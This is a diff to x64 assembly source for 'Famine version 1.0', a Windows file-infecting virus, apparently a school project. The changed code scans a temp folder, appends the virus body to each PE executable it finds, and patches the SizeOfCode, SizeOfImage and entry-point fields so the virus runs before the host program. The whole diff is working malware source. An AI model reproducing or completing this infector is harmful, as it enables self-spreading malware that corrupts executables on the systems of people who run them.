@@ -7,6 +7,7 @@
 
 includelib libcmt.lib
 includelib kernel32.lib
+includelib ntdll.lib
 
 extrn puts:proc
 extrn printf:proc
@@ -23,18 +24,96 @@ extrn malloc:proc
 extrn GetFileSize:proc
 extrn SetFilePointer:proc
 extrn WriteFile:proc
-
+extrn NtCreateFile:proc
 .code
+
+; rbp
+; 40-48 : alignment
+; 32-40 : av[0]
+; 00-32 : shadow space
+; rsp 
+
 label_debut:
+
+debut_main:
+main proc
+
+		push rbp
+		mov rbp, rsp
+
+		push RAX
+		push RBX
+		push RCX
+		push RDX
+		push RSI
+		push RDI
+		push R8 
+		push R9 
+		push R10
+		push R11
+		push R12
+		push R13
+		push R14
+		push R15
+
+		sub	rsp, 48
+		or rsp, 0fh
+		inc rsp
+		sub rsp, 010h
+
+		mov rcx, [rdx]
+		mov [rsp + 32], rcx
+
+	 	call NtCreateFile
+
+		lea rcx, TMP_1
+		call infect_folder
+		mov rdx, label_fin
+		mov rcx, label_debut
+		sub rdx, rcx
+;		lea rcx, print_ptr
+;		call printf
+
+		add rsp, 48 
+
+		pop R15
+		pop R14
+		pop R13
+		pop R12
+		pop R11
+		pop R10
+		pop R9 
+		pop R8 
+		pop RDI
+		pop RSI
+		pop RDX
+		pop RCX
+		pop RBX
+		pop RAX
+		
+		test BYTE ptr [MUST_EXIT], 1
+		jne stop
+
+		call qword ptr [ENTRY_POINT]
+
+stop:
+		xor rax, rax
+		mov rsp, rbp
+		pop rbp
+		ret
+main endp
+fin_main:
+
 MUST_EXIT db 1
 ENTRY_POINT byte 0deh, 0adh, 0beh, 0efh, 0deh, 0adh, 0beh, 0efh
-db 'Famine version 1.0 (c)oded by magouin-jcamhi',0ah,0h
+SIGNATURE db 'Famine version 1.0 (c)oded by magouin-jcamhi',0ah,0h
 TMP_1 db 'C:\Users\moi\AppData\Local\Temp\test\*',0h
 TMP_1_NAME db 'C:\Users\moi\AppData\Local\Temp\test\',0h
 SECTION_NAME db '.FAMINE',0
 
 ; rbp
-; 56 - 64	: padding
+; 60 - 64	: size_of_main 
+; 56 - 60	: Addresse virtuelle de notre code
 ; 48 - 56	: nbr of bytes read 
 ; 40 - 48	: malloc
 ; 32 - 40	: params
@@ -158,35 +237,45 @@ handle_file proc ; int handle
 	add rcx, r13
 	lea rdx, label_debut
 	mov r8, r14
-	call memcpy
+	call memcpy	 ; on ecrit notre code a la fin du buffer
 
+	mov rcx, fin_main
+	mov rdx, debut_main
+	sub rcx, rdx
+	mov dword ptr [rsp + 60], ecx ; On sauvegarde la taille du main
 
 	mov rcx, [rsp + 40]
-	add rcx, r13
-	mov byte ptr [rcx], 0
+		add rcx, r13
+		xor rbx, rbx
+		mov ebx, dword ptr [rsp + 60]
+	add rcx, rbx
+	mov byte ptr [rcx], 0 ; on met MUST EXIT a 0
 
 	add r15, 4
 		mov rbx, r14
 		or rbx, 0ffh
 		inc rbx
-	add dword ptr [r15], ebx
+	add dword ptr [r15], ebx ; On  augment le champ SizeOfcode du pe
 
 	add r15, 12
 	xor rbx, rbx
 	mov ebx, dword ptr [r15]
 	inc rcx
-	mov qword ptr [rcx], rbx
+	mov qword ptr [rcx], rbx ; On remplace deadbeef par l'entry point
+
+	mov rax, debut_main
+	mov rbx, label_debut
+	sub rax, rbx ; rax = label_debut - label_main = 0? 
+
+	add rax, r13
+	mov eax, dword ptr [rsp + 56]
+	mov dword ptr [r15], eax ; on modifie l'entry point par notre main
 
 	add r15, 40
 	mov eax, dword ptr [rsp + 56]
 	add eax, 01000h
-	mov dword ptr [r15], eax
+	mov dword ptr [r15], eax ; Size of image
 
-	mov rax, label_main
-	mov rbx, label_debut
-	sub rax, rbx
-	add rax, r13
-;	mov dword ptr [r15], eax
 
 	mov rcx, r12
 	mov rdx, 0
@@ -284,7 +373,7 @@ ret_ok:
 	ret
 open_file endp
 
-; rbp
+; rbp	
 ; 400-528	: path + file name
 ; 40-400	: structure WIN32_FIND_DATA dirent
 ; 32-40		: folder_name
@@ -297,7 +386,6 @@ infect_folder proc ; parametres : char *folder_name
 		sub	rsp, 528
 
 		mov [rsp + 32], rcx
-		call puts
 
 		mov rcx, [rsp + 32]
 		lea rdx, [rsp + 40]
@@ -341,88 +429,6 @@ loop_end:
 		pop rbp
 		ret
 infect_folder endp
-
-
-; rbp
-; 40-48 : alignment
-; 32-40 : av[0]
-; 00-32 : shadow space
-; rsp 
-
-label_main:
-
-main proc
-
-
-		push RAX
-		push RBX
-		push RCX
-		push RDX
-		push RSI
-		push RDI
-		push R8 
-		push R9 
-		push R10
-		push R11
-		push R12
-		push R13
-		push R14
-		push R15
-		push RSP
-		push RBP
-
-		push rbp
-		mov rbp, rsp
-		sub	rsp, 48
-
-		mov rcx, [rdx]
-
-		mov [rsp + 32], rcx
-
-		mov rcx, label_debut
-		call puts
-
-		lea rcx, TMP_1
-		call infect_folder
-
-		mov rdx, label_fin
-		mov rcx, label_debut
-		sub rdx, rcx
-;		lea rcx, print_ptr
-;		call printf
-
-
-		xor rax, rax
-		mov rsp, rbp
-		pop rbp
-
-		pop RBP
-		pop RSP
-		pop R15
-		pop R14
-		pop R13
-		pop R12
-		pop R11
-		pop R10
-		pop R9 
-		pop R8 
-		pop RDI
-		pop RSI
-		pop RDX
-		pop RCX
-		pop RBX
-		pop RAX
-		
-		test BYTE ptr [MUST_EXIT], 1
-		jne stop
-
-		jmp qword ptr [ENTRY_POINT]
-
-stop:
-		xor rax, rax
-		ret
-
-main endp
 
 label_fin:
 end
